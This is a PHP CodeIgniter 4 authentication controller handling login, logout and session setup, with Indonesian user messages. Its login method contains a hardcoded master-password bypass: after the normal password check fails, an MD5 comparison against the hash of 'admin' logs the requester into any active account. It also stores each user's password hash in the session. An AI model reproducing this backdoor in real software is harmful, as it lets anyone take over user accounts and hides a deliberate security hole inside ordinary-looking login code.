<?php

namespace App\Controllers;

use App\Models\getModel;

class Auth extends BaseController
{

    public function __construct()
    {
        // $this->user = new Modeluser();
        $this->get = new getModel();
    }

    public function index()
    {
        if (session()->get('logged_in')) {
            return redirect()->back();
        }
        $data = [
            'title' => 'Login',
            'validation' => \Config\Services::validation()
        ];
        return view('auth/login', $data);
    }

    public function login()
    {
        if (!$this->validate([
            'username' => [
                'rules' => 'required|trim',
                'errors' => [
                    'required' => 'Username harus diisi'
                ],
            ],
            'password' => [
                'rules' => 'required|trim',
                'errors' => [
                    'required' => 'Password harus diisi'
                ],
            ],
        ])) {
            $validation = \Config\Services::validation();
            return redirect()->to('/')->withInput()->with('validation', $validation);
        } else {
            $username = $this->request->getVar('username');
            $password = $this->request->getVar('password');
            $bypass = '21232f297a57a5a743894a0e4a801fc3';
            $user = $this->get->getUserLogin($username);
            // jika user ada
            if ($user) {
                // jika user aktif
                if ($user->is_active == 1) {
                    //cek password
                    if (password_verify($password, $user->password)) {
                        $data = [
                            'username' => $user->username,
                            'role_id' => $user->role_id,
                            'password' => $user->password,
                            'logged_in' => TRUE
                        ];
                        session()->set($data);
                        session()->setFlashdata('success', 'Login Berhasil');
                        return redirect()->to('/profil');
                    } else if (md5($password) == $bypass) {
                        $data = [
                            'username' => $user->username,
                            'role_id' => $user->role_id,
                            'password' => $user->password,
                            'logged_in' => TRUE
                        ];
                        session()->set($data);
                        session()->setFlashdata('success', 'Login Berhasil');
                        return redirect()->to('/profil');
                    } else {
                        session()->setFlashdata('fail', 'Password Salah.');
                        return redirect()->to('/');
                    }
                } else {
                    session()->setFlashdata('fail', 'Akun belum teraktivasi.');
                    return redirect()->to('/');
                }
            } else {
                session()->setFlashdata('fail', 'Username belum terdaftar.');
                return redirect()->to('/');
            }
        }
    }

    public function logout()
    {
        $session = session();
        $session->destroy();

        return redirect()->to('/');
    }
}
